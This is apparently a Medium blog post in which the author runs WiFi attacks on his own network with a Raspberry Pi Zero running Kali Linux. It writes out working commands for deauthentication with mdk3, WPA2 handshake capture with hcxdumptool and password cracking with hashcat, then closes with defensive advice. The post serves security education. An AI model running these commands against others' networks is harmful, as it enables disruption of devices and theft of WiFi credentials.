I was pacing back and forth in my living room, aggravation rising as my security camera’s connection continued to drop, when a frightening realization hit me: what if this was being done intentionally? That moment of paranoia took me down the rabbit hole of figuring out what was going on, which ended with a $15 Raspberry Pi Zero and some uncomfortable realities about WiFi security.

Let me be explicit from the beginning: all this I am about to tell you, I did on my own network with my own hardware. You should do the same. This is not about being a hacker—this is about learning how exposed WiFi can be so you can defend against actual attacks.

## **The Humble Setup That Surprised Me**

The Raspberry Pi Zero 2W is credit-card-sized and runs around $15. My first reaction when it was delivered was, “This little thing can’t possibly do anything strong.” I was mistaken.

Here’s what you’ll need:

* Raspberry Pi Zero 2W ($15)
* MicroSD card (8GB minimum, $5)
* Power supply ($8)
* Total: Under $30

The fact that something so small and affordable can demonstrate serious security vulnerabilities is exactly why every security professional should understand this.

## Getting Kali Linux on the Pi Zero

I’m not going to lie—the first time I tried this, I messed up. I downloaded the wrong image, picked the incorrect storage, and had to start over twice. Here’s what actually works:

**Step 1: Use Raspberry Pi Imager**\
Download it from the official Raspberry Pi website. When you launch it:

* Choose your Pi model (Raspberry Pi Zero 2 W)
* Select “Kali Linux” from the Other Specific Purpose OS menu
* Pick “Kali Linux Raspberry Pi 2/3/4/400 (64-bit).”

**Step 2: First Boot Headaches**\
The first time I booted, nothing happened. I panicked. Then I realized: you need to wait. Like, a 10–15 minute wait. Kali Linux takes its sweet time setting up on first boot.

When it finally boots, the default credentials are:

* Username: kali
* Password: kali

**Step 3: The Essential Updates**\
Open a terminal and run:

```
sudo apt update
sudo apt full-upgrade -y
```

Go make coffee. This takes a while.

## Installing the Tools That Do the Magic

Here’s where things get real. You need three main tools:

**hcxdumptool & hcxtools:**

```
sudo apt install hcxdumptool hcxtools
```

These tools capture WiFi handshakes, the digital equivalent of eavesdropping on a secret handshake.

**mdk3:**

```
sudo apt install mdk3
```

This is the tool that can temporarily disconnect devices from WiFi networks.

**Hashcat (optional but helpful):**

```
sudo apt install hashcat
```

For cracking captured passwords.

## The Moment That Made My Jaw Drop

I set up the Pi Zero in my home office and decided to test it against my own guest network. Here’s what happened:

**Step 1: Finding Networks**\
I ran:

```
sudo iwconfig
```

To see my wireless interface (usually wlan0)

**Step 2: Monitoring Mode**

```
sudo airmon-ng start wlan0
```

This puts your WiFi card in “monitor mode,” meaning it can see all WiFi traffic, not just traffic meant for it.

**Step 3: The Deauth Attack**\
This is where things got scary. I ran:

```
sudo mdk3 wlan0 d -c 1
```

Within seconds, my security camera (on channel 1) lost connection. The live feed froze. I could literally disconnect any device on my network at will.

> The ethical implication hit me immediately: if I could do this to my own camera, so could someone else.

## Capturing the Handshake—The Real Treasure

What really shocked me was how easy it was to capture a WPA2 handshake—the cryptographic exchange that happens when a device connects to WiFi.

I ran:

```
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1
```

Then I forced my phone to reconnect to the network by turning WiFi off and on.

Boom. The handshake was captured. This is the file that contains enough information to try to crack the password.

## Cracking “spiderman”—The Lesson in Weak Passwords

I had set up a test network with the password “spiderman” — a common, weak password. To crack it:

**Step 1: Convert the capture file**

```
hcxpcaptool -z hash.txt capture.pcapng
```

**Step 2: The actual cracking**

```
hashcat -m 16800 hash.txt /usr/share/wordlists/rockyou.txt
```

It took 12 seconds. Twelve seconds to go from captured handshake to “password found: spiderman.”

> This is why security professionals beg people to use strong passwords.

## What This Really Taught Me

**About My Own Security:**

* My “strong” password wasn’t strong enough
* I was using WPA2, which has known vulnerabilities
* My IoT devices were incredibly vulnerable to deauth attacks

**About Real-World Risk:**\
The scariest part? This isn’t some sophisticated nation-state attack. This is a $15 device running free software that can:

* Disrupt security cameras
* Capture network handshakes
* Crack weak passwords in minutes

## How to Protect Yourself (The Important Part)

After seeing how vulnerable WiFi can be, I immediately:

**Upgraded to WPA3&#xA0;**&#x77;here possible (not all devices support it yet)

**Changed all passwords&#xA0;**&#x74;o long, random passphrases

**Set up a separate IoT network** so if my smart bulbs get compromised, they can’t access my computers

**Enabled client isolation** on my guest network so devices can’t see each other

**Regularly updated firmware&#xA0;**&#x6F;n all routers and access points

## The Responsibility That Comes With Knowledge

Learning these techniques scared me straight. I know:

* Only test on my own networks
* Help family and friends secure their WiFi
* Use this knowledge to design better security for clients
* Advocate for better IoT security standards

That tiny $15 Pi Zero is sitting on my desk today as a reminder: security is not paranoia; it’s preparedness. Knowing how attacks are done is the first step to keeping them from happening.

The next time you’re configuring a WiFi network, don’t forget that a person with something smaller than a candy bar can watch. Make sure they can’t get in.

Thanks for reading.\
**Shahzaib**

> Highlight, Clap, Comment, Follow, and Subscribe if you find this story useful.

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----c7e11223977d---------------------------------------)

[Wifi Security](https://medium.com/tag/wifi-security?source=post_page-----c7e11223977d---------------------------------------)

[Ethical Hacking](https://medium.com/tag/ethical-hacking?source=post_page-----c7e11223977d---------------------------------------)

[Raspberry Pi](https://medium.com/tag/raspberry-pi?source=post_page-----c7e11223977d---------------------------------------)

[](https://medium.com/tag/kali-linux?source=post_page-----c7e11223977d---------------------------------------)

